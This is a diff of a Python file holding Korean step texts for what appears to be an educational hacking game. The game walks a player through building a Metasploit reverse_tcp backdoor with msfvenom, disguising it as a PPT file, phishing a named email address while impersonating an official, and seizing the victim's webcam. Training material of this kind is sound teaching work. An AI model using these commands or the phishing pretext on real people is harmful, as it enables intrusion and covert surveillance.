@@ -34,7 +34,7 @@ def api(type: str):
     'TIPS\n""안에 있는 명령어는 <>안에 내용을 읽고 그것으로 대체해서 입력해줘!\n예시) user가 decode, url이 sv.m03.pw, port가 100이라면 만약 "ssh <USER>@<URL> -p <PORT>"이렇게 치라고 하면 밑의 명령줄에 ssh decode@sv.m03.pw -p 100 이라고 입력하라고... 한번 해보자..\n',
     '우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까?? "ipconfig"를 치면 나올꺼야!! 그리고 만약 정답을 모르겠으면 "show_ans"를 치면 위에 답이 나와! \n',
     '백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. METASPLOIT은 msfvenom라는 명령어로 확인할 수 있습니다! 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <명령어>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까? msfvenom 사용법은 "man msfvenom"을 치면 알 수 있겠지?',
-    '이제 백도어를 만들어야 겠지? 동영상에서 알려준 대로 백도어 파일을 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f PPT > back.PPT으로 back.exe라는 파일을 만들자! 게임 실행파일이 있는 곳과 같은 곳에 만들어 질거야!',
+    '이제 백도어를 만들어야 겠지? 동영상에서 알려준 대로 백도어 파일을 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!\n\n"msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f PPT > back.PPT"으로 back.exe라는 파일을 만들자! 게임 실행파일이 있는 곳과 같은 곳에 만들어 질거야!',
     '''울랄라 대표의 이메일은 gshsdecode@gmail.com이야.
 여기에 만든 파일을 보낼 건데 대표가 이메일의 내용물을 다운받을 수 있게끔 낚시성 내용을 적어야겠지?
 국방부 장관인척하고 보내도 되고 어그로를 끌 수 있는 자극적인 내용을 보내도 돼.
@@ -56,7 +56,7 @@ def api(type: str):
     ['도움말을 읽어보고 무엇을 해야 할지 생각해 보자! 근데 페이로드는 뭐고, msfvenom은 뭐지..? "openvideo"를 치고 영상을 보고 다음 단계로 넘어가자!','sys:run explorer http://sv.m03.pw:8000/video/p01.mp4'],
     ['이제 다운로드 폴더에 EXE파일이 생성되었겠지?? 다음단계로 넘어가서 이 파일을 보내보자!'],
     ['이제 msf콘솔을 사용할 수 있어!\n원격제어를 하기위한 방법을 알기전에 영상을 보자. 어떤 명령어를 입력해야 하지? "openvideo" \n\n영상을 본 후에 다음 단계로 넘어가자\n','sys:run explorer http://sv.m03.pw:8000/video/p02.mp4'],
-    ['','페이로드도 세팅되었으니 IP를 입력 해야겠지?(<명령어> LHOST=<IP>형식으로 입력하자)','포트번호도 입력해야지? LPORT=<포트>','이제 상대컴퓨터와 우리 컴퓨터의 연결이 끊어졌을 때를 대비해 우리 PC가 상대의 연결을 상시 대기할 수 있도록 하는 작업이 필요해. ExitONsession false라는 명령어를 세팅하면 그 기능을 실행할 수 있어.','좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 걸까?','\n해보자!\n','sys:run explorer http://sv.m03.pw:8000/video/01.mp4'],
+    ['다음.','페이로드도 세팅되었으니 IP를 입력 해야겠지?(<명령어> LHOST=<IP>형식으로 입력하자)','포트번호도 입력해야지? LPORT=<포트>','이제 상대컴퓨터와 우리 컴퓨터의 연결이 끊어졌을 때를 대비해 우리 PC가 상대의 연결을 상시 대기할 수 있도록 하는 작업이 필요해. ExitONsession false라는 명령어를 세팅하면 그 기능을 실행할 수 있어.','좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 걸까?','\n해보자!\n','sys:run explorer http://sv.m03.pw:8000/video/01.mp4'],
     ['좋아! 전송됐어!! 이제 많은 사람들이 진실을 알게 될거야!!!!!! 뉴스를 한번 볼까?? "openvideo"','sys:run explorer http://sv.m03.pw:8000/video/02.mp4'],
     ['sys:run explorer http://sv.m03.pw:8000/file/csrf.pdf'],
     ['sys:run explorer http://self.m03.pw/quiz.html'],
